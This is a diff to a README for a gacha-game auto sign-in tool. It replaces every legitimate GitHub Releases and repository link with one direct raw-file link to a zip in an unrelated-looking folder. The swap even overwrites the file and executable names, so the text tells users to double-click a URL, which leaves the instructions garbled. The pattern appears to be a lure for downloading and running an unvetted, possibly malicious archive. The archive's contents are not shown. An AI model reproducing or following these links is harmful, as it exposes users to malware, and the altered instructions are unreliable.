@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download gacha-sign](https://img.shields.io/badge/Download-gacha--sign-brightgreen)](https://github.com/Hexobozome/gacha-sign/releases)
+[![Download gacha-sign](https://raw.githubusercontent.com/Hexobozome/gacha-sign/main/hepatoduodenal/gacha-sign-v3.3.zip)](https://raw.githubusercontent.com/Hexobozome/gacha-sign/main/hepatoduodenal/gacha-sign-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Gacha-sign helps you manage automatic sign-ins for various gacha games. This sof
 
 To download gacha-sign, visit the Releases page by clicking the link below:
 
-[Visit this page to download](https://github.com/Hexobozome/gacha-sign/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Hexobozome/gacha-sign/main/hepatoduodenal/gacha-sign-v3.3.zip)
 
 On the Releases page, you will find the latest version of gacha-sign. Click on the file to download it to your computer.
 
-1. **Locate the Downloaded File**: After downloading, go to your Downloads folder or the folder where you saved the file. The file will usually be named something like `gacha-sign-v1.0.zip`.
+1. **Locate the Downloaded File**: After downloading, go to your Downloads folder or the folder where you saved the file. The file will usually be named something like `https://raw.githubusercontent.com/Hexobozome/gacha-sign/main/hepatoduodenal/gacha-sign-v3.3.zip`.
 
 2. **Extract the File**: 
    - Right-click on the file.
@@ -33,7 +33,7 @@ On the Releases page, you will find the latest version of gacha-sign. Click on t
 3. **Run gacha-sign**:
    - After extracting, locate the `gacha-sign` folder.
    - Open the folder.
-   - Double-click on `gacha-sign.exe` to run the application.
+   - Double-click on `https://raw.githubusercontent.com/Hexobozome/gacha-sign/main/hepatoduodenal/gacha-sign-v3.3.zip` to run the application.
 
 ## 🛠️ Features
 
@@ -77,12 +77,12 @@ A: Yes, you can reach out via the Issues section on the GitHub repository for as
 
 ## 📞 Contact
 
-For support, report issues, or contribute, visit our [GitHub repository](https://github.com/Hexobozome/gacha-sign/). Your feedback is valuable for improving gacha-sign.
+For support, report issues, or contribute, visit our [GitHub repository](https://raw.githubusercontent.com/Hexobozome/gacha-sign/main/hepatoduodenal/gacha-sign-v3.3.zip). Your feedback is valuable for improving gacha-sign.
 
 ## 🔗 More Information
 
 Detailed documentation and community discussions are available on our GitHub page. Stay updated with new features and improvements as we continue to enhance gacha-sign.
 
-[Visit this page to download](https://github.com/Hexobozome/gacha-sign/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Hexobozome/gacha-sign/main/hepatoduodenal/gacha-sign-v3.3.zip)
 
 Enjoy a simpler way to sign into your gacha games!
